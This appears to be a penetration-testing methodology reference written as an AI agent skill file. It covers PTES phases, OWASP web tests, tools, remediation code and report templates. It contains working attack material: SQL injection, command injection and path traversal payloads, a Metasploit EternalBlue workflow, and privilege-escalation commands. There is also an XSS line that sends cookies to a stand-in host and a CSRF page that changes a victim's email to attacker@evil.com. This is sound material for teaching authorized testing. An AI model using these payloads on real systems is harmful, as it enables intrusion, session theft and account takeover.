<!-- Part of the Penetration Testing AbsolutelySkilled skill. Load this file when
     planning a pentest engagement, following a structured methodology, or needing
     detailed phase-by-phase guidance and tool reference. -->

# Penetration Testing Methodology Reference

Detailed methodology for authorized security assessments. This reference covers PTES
(Penetration Testing Execution Standard) and the OWASP Testing Guide (OTG v4) in full
phase-by-phase detail, with tool commands and reporting templates. All techniques here
apply exclusively within written authorized engagements or CTF/lab environments.

---

## 1. PTES - Penetration Testing Execution Standard

PTES defines seven phases. The first two (pre-engagement and intelligence gathering)
are where most engagements succeed or fail - thorough preparation prevents legal
exposure and wasted testing time.

### Phase 1: Pre-Engagement

**Deliverables required before testing starts:**

- Signed Statement of Work (SOW) defining the engagement type, timeline, and cost
- Rules of Engagement (ROE) document (see template below)
- Written authorization letter on client letterhead (carry during on-site tests)
- Emergency contact list (client security team, escalation path)

**ROE template - minimum fields:**

```
RULES OF ENGAGEMENT

Engagement:     [Client Name] Penetration Test
Tester:         [Name / Organization]
Date range:     [Start] to [End]
Testing hours:  [e.g., 09:00-17:00 local time weekdays only]

IN-SCOPE SYSTEMS:
  IP ranges:    10.0.1.0/24, 10.0.2.0/24
  Domains:      app.example.com, api.example.com
  Applications: Customer portal, Admin dashboard

OUT-OF-SCOPE SYSTEMS:
  - All systems not listed above
  - Third-party payment processor (PCI scope - separate authorization required)
  - Production database servers (read-only access only)

AUTHORIZED TEST TYPES:
  [X] External network scanning
  [X] Web application testing (OWASP OTG)
  [X] Authenticated internal testing
  [ ] Social engineering (NOT authorized)
  [ ] Denial of service (NOT authorized)
  [ ] Physical access (NOT authorized)

EMERGENCY CONTACTS:
  Primary:   [Name, Phone, Email]
  Secondary: [Name, Phone, Email]

DATA HANDLING:
  Captured credentials must be destroyed within 7 days of engagement close.
  No PII may be removed from client systems or stored beyond the engagement.

Authorized by: [Client Name, Title, Signature, Date]
Tester:        [Tester Name, Signature, Date]
```

### Phase 2: Intelligence Gathering (Reconnaissance)

Reconnaissance divides into passive (no direct contact with target) and active
(direct interaction with target systems).

#### Passive Reconnaissance

Goal: build a target profile without triggering IDS or alerting the client.

| Technique | Tool | What it finds |
|---|---|---|
| WHOIS / DNS | `whois`, `dig`, `dnsx` | Registrant info, name servers, mail servers |
| Subdomain enumeration | `subfinder`, `amass`, `dnsx` | Attack surface expansion |
| Certificate transparency | `crt.sh`, `censys` | Subdomains via TLS cert logs |
| Search engine OSINT | Google dorks, Shodan, FOFA | Exposed panels, indexed files, server banners |
| GitHub/GitLab OSINT | `trufflehog`, `gitleaks`, manual search | Leaked credentials, API keys, internal hostnames |
| LinkedIn / social | Manual | Employee names for spear phishing (if authorized) |

**Useful Google dorks:**

```
site:example.com filetype:pdf           # Indexed documents
site:example.com inurl:admin            # Admin panels
site:example.com "Index of /"           # Directory listings
"example.com" ext:env OR ext:log        # Exposed config files
intitle:"Grafana" site:example.com      # Exposed monitoring dashboards
```

**Shodan queries:**

```
hostname:example.com                    # All indexed hosts for domain
org:"Example Inc" port:22              # SSH servers in org
ssl.cert.subject.cn:example.com        # Hosts by TLS cert
```

#### Active Reconnaissance

Goal: direct contact with target systems within authorized scope.

```bash
# DNS zone transfer attempt (often fails, but worth trying)
dig axfr @ns1.example.com example.com

# Subdomain brute-force with wordlist
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://FUZZ.example.com -mc 200,301,302

# Virtual host brute-force (same IP, different Host headers)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://10.0.1.1 -H "Host: FUZZ.example.com" -mc 200,301

# Web content discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://app.example.com/FUZZ -mc 200,301,302,403
```

### Phase 3: Threat Modeling

Map findings from reconnaissance to potential attack paths before active exploitation:

1. **Entry points** - List all discovered endpoints, ports, and authentication surfaces
2. **Assets at risk** - What data or systems have the most business value?
3. **Attack vectors** - For each entry point, list applicable vulnerability classes
4. **Prioritization** - Start with highest-impact, lowest-barrier attack paths

Use a simple matrix:

| Entry point | Vulnerability class | Exploitability | Impact | Priority |
|---|---|---|---|---|
| Login form (app.example.com) | Brute force, SQLi, CSRF | Medium | High | 1 |
| API endpoint /api/v1/users | IDOR, broken auth | Low (needs token) | High | 2 |
| Admin panel (10.0.1.5:8080) | Default creds, exposed to internet | High | Critical | 1 |

### Phase 4: Vulnerability Research and Analysis

Identify specific CVEs and misconfigurations in discovered services:

```bash
# Nessus / OpenVAS: run credentialed scan for known CVEs
# (GUI-based - configure via web interface)

# Nmap NSE vulnerability scripts
nmap --script vuln -p 80,443,22,21 10.0.1.0/24 -oA vuln-scan

# Searchsploit: find public exploits for identified service versions
searchsploit apache 2.4.49
searchsploit openssh 7.2

# Check NVD/CVE databases for CVSS scores
# https://nvd.nist.gov/vuln/search
```

### Phase 5: Exploitation

Execute proof-of-concept exploits for confirmed vulnerabilities, within scope and
using minimal-impact approaches.

**Exploitation discipline:**

- Confirm the vulnerability with a benign payload before using a full exploit
  (e.g., `sleep(5)` for SQLi, `alert(1)` for XSS before stored payloads)
- Log every exploit attempt with timestamp, target, payload, and result
- Prefer PoC-only exploitation (demonstrate the bug exists) over full shells unless
  the engagement explicitly requires demonstrating full post-exploitation
- Never use exploits that could cause data corruption or service outage without
  explicit written authorization from the client

**Metasploit framework workflow:**

```bash
msfconsole

# Search for modules
search type:exploit name:eternalblue
search cve:2021-44228

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.1.50
set LHOST 10.0.1.200
set LPORT 4444
check           # Verify target is vulnerable before exploiting
run
```

**Manual SQL injection testing:**

```
# Error-based detection (in parameter or request body)
' OR '1'='1
' OR '1'='1'--
' UNION SELECT NULL--

# Time-based blind (when no visible error)
' AND SLEEP(5)--
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--

# SQLMap for authorized automated testing
sqlmap -u "https://app.example.com/item?id=1" --dbs --batch
sqlmap -u "https://app.example.com/item?id=1" -D targetdb --tables --batch
```

**XSS payload progression:**

```javascript
// Step 1: Prove execution (benign)
<script>alert(document.domain)</script>

// Step 2: Demonstrate session theft risk (no actual theft in PoC)
<script>alert(document.cookie)</script>

// Step 3: For stored XSS PoC - use a callback to your listener
<script>new Image().src='https://your-burp-collaborator.com/?c='+document.cookie</script>
```

### Phase 6: Post-Exploitation

Assess the depth of compromise after initial foothold. Only perform activities
explicitly authorized in the ROE.

**Common post-exploitation activities (when authorized):**

| Activity | Purpose | Tool |
|---|---|---|
| Privilege escalation | Demonstrate impact beyond initial access level | LinPEAS, WinPEAS, GTFOBins |
| Credential harvesting | Show breadth of credential exposure | Mimikatz (Windows, if authorized), `/etc/shadow` review |
| Lateral movement | Demonstrate network segmentation gaps | Pivoting via compromised host, SSH key reuse |
| Persistence | Demonstrate that an attacker could maintain long-term access | Cron job, SSH authorized_keys (authorized and removed after demonstration) |
| Data access | Demonstrate what data is reachable, not extract it | Directory listing, not exfiltration |

**Privilege escalation checklist (Linux):**

```bash
# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# World-writable cron jobs
ls -la /etc/cron* /var/spool/cron/

# Sudo permissions
sudo -l

# Kernel version (check against known local privilege escalation CVEs)
uname -a

# Running services as root
ps aux | grep root

# Capabilities
getcap -r / 2>/dev/null
```

### Phase 7: Reporting

See SKILL.md for report structure. Extended guidance:

**Finding severity classification with CVSS v3.1 examples:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  = 9.8 Critical
  (Network, Low complexity, No privileges, No user interaction, unchanged scope,
   High confidentiality/integrity/availability impact)

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N  = 6.5 Medium
  (Network, Low complexity, Low privileges required, High confidentiality impact only)

CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N  = 3.1 Low
  (Network, High complexity, No privileges, User interaction required, Low confidentiality)
```

**Evidence documentation standards:**

- Screenshots must include the full browser window or terminal with URL/hostname visible
- HTTP request/response pairs from Burp Suite: include raw request and response
- Command output: include the full command run, not just the output
- Timestamps in all screenshots (enable system clock display)
- For video evidence: record screen with tool and timestamp visible

---

## 2. OWASP Testing Guide (OTG) v4 - Web Application

The OWASP Testing Guide provides a comprehensive checklist for web application
security testing. Below are the highest-priority test categories with key tests and
techniques.

### OTG-INFO: Information Gathering

| Test ID | Test name | Technique |
|---|---|---|
| OTG-INFO-001 | Conduct search engine discovery | Google dorks, Shodan, Censys |
| OTG-INFO-002 | Fingerprint web server | HTTP response headers, error page analysis |
| OTG-INFO-003 | Review webserver metafiles | `robots.txt`, `sitemap.xml`, `.well-known/` |
| OTG-INFO-004 | Enumerate application on webserver | ffuf, dirbuster, feroxbuster |
| OTG-INFO-005 | Review webpage content for leakage | HTML comments, JS source maps, debug info |
| OTG-INFO-006 | Identify application entry points | Spider, manual review, API endpoints |
| OTG-INFO-007 | Map execution paths through app | Burp Suite site map, manual walkthrough |
| OTG-INFO-008 | Fingerprint web application framework | X-Powered-By, cookies, file extensions |
| OTG-INFO-009 | Fingerprint web application | CMS detection (WhatWeb, Wappalyzer) |
| OTG-INFO-010 | Map application architecture | Load balancers, WAF, CDN detection |

### OTG-AUTHN: Authentication Testing

| Test ID | Test name | Key checks |
|---|---|---|
| OTG-AUTHN-001 | Testing for credentials over encrypted channel | No HTTP fallback, HSTS header present |
| OTG-AUTHN-002 | Testing for default credentials | Admin/admin, test/test, vendor default lists |
| OTG-AUTHN-003 | Testing for weak lockout mechanism | 10-20 failed attempts, no lockout = fail |
| OTG-AUTHN-004 | Testing for bypassing authentication schema | Direct URL access post-login, parameter manipulation |
| OTG-AUTHN-005 | Testing for vulnerable remember password | Password stored in cookie, weak token |
| OTG-AUTHN-006 | Testing the browser cache for sensitive information | Cache-Control: no-store on auth pages |
| OTG-AUTHN-007 | Testing for weak password policy | Minimum length, complexity, history |
| OTG-AUTHN-008 | Testing for weak security question/answer | Guessable answers, unlimited retries |
| OTG-AUTHN-009 | Testing for weak password change or reset | Token entropy, single-use enforcement, expiry |
| OTG-AUTHN-010 | Testing for weaker authentication in alternative channel | Mobile API, SSO fallback, 2FA bypass |

### OTG-AUTHZ: Authorization Testing

| Test ID | Test name | Key checks |
|---|---|---|
| OTG-AUTHZ-001 | Testing directory traversal / file include | `../../../etc/passwd`, LFI via parameter |
| OTG-AUTHZ-002 | Testing for bypassing authorization schema | Change user ID in URL, JWT role manipulation |
| OTG-AUTHZ-003 | Testing for privilege escalation | Horizontal (user A accessing user B data), vertical (user to admin) |
| OTG-AUTHZ-004 | Testing for IDOR | Replace object references in requests, parameter tampering |

**IDOR testing pattern:**

```
1. Create two test accounts: user_a and user_b
2. As user_a, create a resource (order, message, profile)
   Note the resource ID (e.g., /api/orders/4521)
3. As user_b, attempt to access /api/orders/4521
4. If successful: IDOR confirmed - HIGH severity
5. Test for write/delete IDOR separately (often more impactful than read)
```

### OTG-SESS: Session Management Testing

| Test ID | Test name | Key checks |
|---|---|---|
| OTG-SESS-001 | Testing for cookie attributes | Secure, HttpOnly, SameSite, Domain, Path, Expiry |
| OTG-SESS-002 | Testing for cookie padding | No base64-encoded predictable values |
| OTG-SESS-003 | Testing for session token entropy | Min 128 bits entropy, no sequential IDs |
| OTG-SESS-004 | Testing for session fixation | New token issued after authentication |
| OTG-SESS-005 | Testing for CSRF | Token validation on state-changing requests |
| OTG-SESS-006 | Testing for logout functionality | Server-side session invalidation, not just cookie deletion |
| OTG-SESS-007 | Testing session timeout | Idle timeout enforced server-side |
| OTG-SESS-008 | Testing for session puzzling | Session variable used in multiple contexts |

**CSRF PoC template:**

```html
<!-- Host this on your test server to demonstrate CSRF -->
<html>
  <body>
    <form id="csrf-form" action="https://app.example.com/api/user/email"
          method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
  </body>
</html>
```

### OTG-INPVAL: Input Validation Testing

| Vulnerability | Test technique | Tool |
|---|---|---|
| Reflected XSS | Inject `<script>alert(1)</script>` in all input fields, URL params, headers | Burp Suite, XSStrike |
| Stored XSS | Persist payload via form submission, check rendered output elsewhere | Manual, Burp Suite |
| DOM-based XSS | Inspect JS code for `innerHTML`, `document.write`, `eval` with user input | Manual code review |
| SQL Injection | `'`, `' OR '1'='1'--`, `' UNION SELECT NULL--` | SQLMap (authorized), Burp Scanner |
| Command Injection | `; id`, `| id`, `$(id)`, backtick injection | Manual, commix |
| SSRF | Point URL parameters to internal services: `http://169.254.169.254/` | Burp Collaborator, ssrfmap |
| XXE | Submit XML with external entity referencing `/etc/passwd` | Manual, Burp Suite |
| Path Traversal | `../../../etc/passwd`, URL-encoded variants `%2e%2e%2f` | Manual, dotdotpwn |
| Open Redirect | Manipulate redirect parameters to external URL | Manual |

---

## 3. Tool Reference

### Reconnaissance

| Tool | Purpose | Key command |
|---|---|---|
| `nmap` | Port scanning, service detection | `nmap -sV -sC -p- --open target` |
| `subfinder` | Passive subdomain enumeration | `subfinder -d example.com` |
| `amass` | Active + passive subdomain enumeration | `amass enum -d example.com` |
| `ffuf` | Web fuzzing (dirs, subdomains, params) | `ffuf -w wordlist.txt -u https://example.com/FUZZ` |
| `theHarvester` | Email, subdomain, hostname OSINT | `theHarvester -d example.com -b google,bing` |
| `shodan` CLI | Search Shodan from terminal | `shodan search hostname:example.com` |

### Web Application

| Tool | Purpose | Notes |
|---|---|---|
| Burp Suite Community | HTTP proxy, manual testing | Free; use Pro for automated scanner |
| OWASP ZAP | Automated web scanner | Free, good for CI integration |
| SQLMap | SQL injection automation | Always use `--batch`, save output |
| Nikto | Web server misconfiguration scan | Fast initial scan, noisy |
| WhatWeb | Web tech fingerprinting | `whatweb https://example.com` |
| dirsearch | Directory/file brute-force | `dirsearch -u https://example.com` |

### Exploitation

| Tool | Purpose | Notes |
|---|---|---|
| Metasploit Framework | Exploit development and execution | `msfconsole`, use `check` before `run` |
| searchsploit | Offline exploit database search | `searchsploit apache 2.4` |
| pwncat | Reverse shell handler with features | Better than raw netcat for Linux targets |
| impacket | Windows/AD protocol exploitation | `secretsdump.py`, `psexec.py` |

### Post-Exploitation

| Tool | Purpose | Platform |
|---|---|---|
| LinPEAS | Local privilege escalation enumeration | Linux |
| WinPEAS | Local privilege escalation enumeration | Windows |
| GTFOBins | SUID/sudo binary abuse reference | Linux (web reference) |
| Mimikatz | Credential dumping | Windows (explicit authorization required) |
| BloodHound | Active Directory attack path mapping | Windows AD environments |

---

## 4. Common Vulnerability Patterns with Remediation

### SQL Injection

**Vulnerable:**
```python
query = "SELECT * FROM users WHERE id = " + user_input
```

**Remediation:**
```python
# Parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))

# ORM with bind parameters
User.objects.filter(id=user_input)
```

### Stored XSS

**Vulnerable:**
```javascript
document.getElementById('output').innerHTML = userInput;
```

**Remediation:**
```javascript
// Use textContent, never innerHTML with user input
document.getElementById('output').textContent = userInput;

// If HTML output is required, use a sanitization library
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### IDOR

**Vulnerable:**
```python
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, current_user: User):
    return db.query(Order).filter(Order.id == order_id).first()
```

**Remediation:**
```python
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, current_user: User):
    order = db.query(Order).filter(
        Order.id == order_id,
        Order.owner_id == current_user.id  # ownership check
    ).first()
    if not order:
        raise HTTPException(status_code=404)  # don't leak existence
    return order
```

### SSRF

**Vulnerable:**
```python
url = request.form.get('url')
response = requests.get(url)  # fetches whatever the user provides
```

**Remediation:**
```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = {'https'}
BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # AWS metadata
    ipaddress.ip_network('127.0.0.0/8'),
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return False
    except ValueError:
        pass  # hostname, not IP - also validate via DNS resolution
    return True
```

---

## 5. Reporting Template

### Finding template

```markdown
## [SEVERITY] Finding Title

**Severity:** Critical / High / Medium / Low / Informational
**CVSS v3.1 Score:** 9.8
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**CWE:** CWE-89 (SQL Injection)
**Affected URL/Host:** https://app.example.com/api/login
**Tested on:** 2026-03-10

### Description
Describe the vulnerability, what it is, and why it exists in the application.

### Evidence
[Screenshot or request/response pair]

Request:
POST /api/login HTTP/1.1
Host: app.example.com
Content-Type: application/json

{"username": "admin'--", "password": "anything"}

Response:
HTTP/1.1 200 OK
{"token": "eyJ..."}

### Impact
Describe what an attacker can achieve. Be specific to this application.

### Remediation
Specific fix with code example if applicable.

**References:**
- OWASP: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
```

---

## 6. Responsible Disclosure Timeline

When critical findings are discovered during an engagement:

```
Day 0:   Critical/High finding discovered
Day 0:   Notify client emergency contact immediately (phone, not just email)
Day 0:   Document finding with full evidence
Day 1:   Provide preliminary written notification with severity and impact summary
Day X:   Full report delivered per engagement timeline
Day X+:  Remediation validation test (if in scope)
```

For bug bounty programs (not client engagements), follow the platform's disclosure
timeline - typically 90 days before public disclosure, with extensions for complex
fixes.
